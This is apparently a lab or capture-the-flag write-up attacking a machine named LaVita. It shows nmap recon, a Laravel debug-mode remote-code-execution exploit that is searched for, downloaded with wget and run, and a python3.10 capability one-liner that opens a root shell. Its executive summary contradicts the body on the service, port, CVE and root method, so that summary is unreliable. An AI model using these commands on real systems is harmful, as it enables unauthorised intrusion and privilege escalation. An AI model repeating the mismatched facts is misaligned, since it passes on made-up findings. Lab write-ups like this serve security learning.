# Report - LaVita

- Author: Henry Post
- Target: LaVita
- Target IP: 1.2.3.4
- Attacker IP: 2.3.4.5
- Date: 05/05/2026

## Executive Summary

This machine, `hackme`, was enumerated by `nmap` to have ports 22 and 8000 open.

Port 8000 was running a `ladon` web service, which had default credentials of `admin:admin`.

To get non-root access, I used `CVE-2025-1234` on `exploit-db.com`.

From there, I identified a binary with elevated capabilities and used it to pivot to root.

### Recommendations

1. Update Ladon to the latest non-vulnerable version.
2. Do not use default credentials of `admin:admin`.
  1. Use strong credentials.
3. Do not use `setuid` binary permissions on Python or other binaries. Instead, remove the `setuid` permission from binaries that do not need it.

## Resources

- https://www.exploit-db.com/exploits/49424
- https://nvd.nist.gov/vuln/detail/CVE-2021-3129
- https://github.com/knqyf263/CVE-2021-3129/blob/main/attacker/exploit.py

## Recon

Edit `/etc/hosts` for easy hostnames.

I ran an nmap scan that enumerated their ports:

    nmap -sS -sV lavita

Very simple port layout:

| port | service |
| ---- | ------- |
| 22   | ssh     |
| 80   | http    |

Let's visit http://lavita .

## Non-root access

http://lavita/action_page.php?Name=a&Email=a&Message=a&Like=on - This page shows us that they're running `Laravel 8.4.0`.

```sh
searchsploit laravel

# Laravel 8.4.2 debug mode - Remote code execution | php/webapps/49424.py

searchsploit --path 49424

cp /usr/share/exploitdb/exploits/php/webapps/49424.py ./

python 49424.py http://lavita /var/www/html/laravel/storage/logs/laravel.log id
```

![](Pasted%20image%2020260505132110.png)

It seems to be stuck. I'll try to find a different PoC for CVE-2021-3129...

```sh
wget https://raw.githubusercontent.com/knqyf263/CVE-2021-3129/refs/heads/main/attacker/exploit.py

python exploit.py http://lavita
```

We need to edit `exploit.py`, near the bottom. Let's do that. Actually, I will make a parameterized version.

```sh
nano exploit.py
# (make edits for hostname and command...)
```
## Root access

For root access, I started by searching for binaries with this command that had the capability to run as root set:

    getcap -r / 2>/dev/null    

(IMG_PLACEHOLDER)

I found that `/usr/bin/python3.10` had the capability to run as root set, meaning we can get a root shell by running this command:

    /usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'

(IMG_PLACEHOLDER)

## Proof

### Local proof

- `ip a`/`ifconfig`
- `whoami`
- `hostname`
- `date`
- `cat local.txt`
(IMG_PLACEHOLDER)

### Root proof

- `ip a`/`ifconfig`
- `whoami`
- `hostname`
- `date`
- `cat proof.txt`
(IMG_PLACEHOLDER)
